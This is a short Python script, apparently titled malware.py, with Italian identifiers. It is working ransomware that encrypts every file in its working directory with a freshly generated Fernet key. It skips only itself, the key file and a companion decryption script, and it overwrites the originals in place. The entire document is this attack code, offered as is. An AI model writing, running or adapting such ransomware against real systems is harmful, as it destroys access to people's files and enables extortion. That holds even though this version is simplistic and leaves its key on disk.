import os
from cryptography.fernet import Fernet

def read_files():
    files = []

    for file in os.listdir():
        if file == 'malware.py' or file == 'chiave.key' or file == 'decriptazione.py':
            continue
        if os.path.isfile(file):
            files.append(file)
    
    return files

def save_key():
    key = Fernet.generate_key()
    print(key)

    with open('chiave.key', 'wb') as chiave:
        chiave.write(key)
        return key

def encrypt_files(files, key):
    for file in files:
        with open(file, 'rb') as file_r:
            contenuto = file_r.read()
        contenuto_criptato = Fernet(key).encrypt(contenuto)
        with open(file, 'wb') as file_w:
            file_w.write(contenuto_criptato)

def main():
    files = read_files()
    key = save_key()
    encrypt_files(files, key)

if __name__ == '__main__':
    main()
